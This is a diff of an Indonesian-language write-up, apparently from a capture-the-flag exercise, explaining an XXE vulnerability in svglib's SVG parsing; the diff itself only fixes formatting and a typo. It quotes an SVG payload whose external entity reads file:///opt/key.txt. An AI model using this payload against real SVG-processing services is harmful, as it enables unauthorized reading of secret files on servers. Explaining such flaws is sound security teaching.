@@ -4,7 +4,7 @@
 Proses convert svg ke png menggunakan library `svglib`. Dimana secara internal `svglib` akan melakukan parsing XML menggunakan module `etree`dan yang di parsing adalah document root nya.
 
 
-```
+```python
 def svg2rlg(path, **kwargs):
     "Convert an SVG file to an RLG Drawing object."
     ....
@@ -19,10 +19,10 @@ def svg2rlg(path, **kwargs):
 
 ```
 
-Pada method `XMLParser` paramter `resolve_entities = False` tidak digunakan.
+Pada method `XMLParser` parameter `resolve_entities = False` tidak digunakan.
 Oleh karena itu bisa dilakukan `XXE Injection`
 
-```
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE svg [ <!ENTITY tasty SYSTEM "file:///opt/key.txt"> ]>
 <svg width="520px" height="100px"  xmlns="http://www.w3.org/2000/svg">
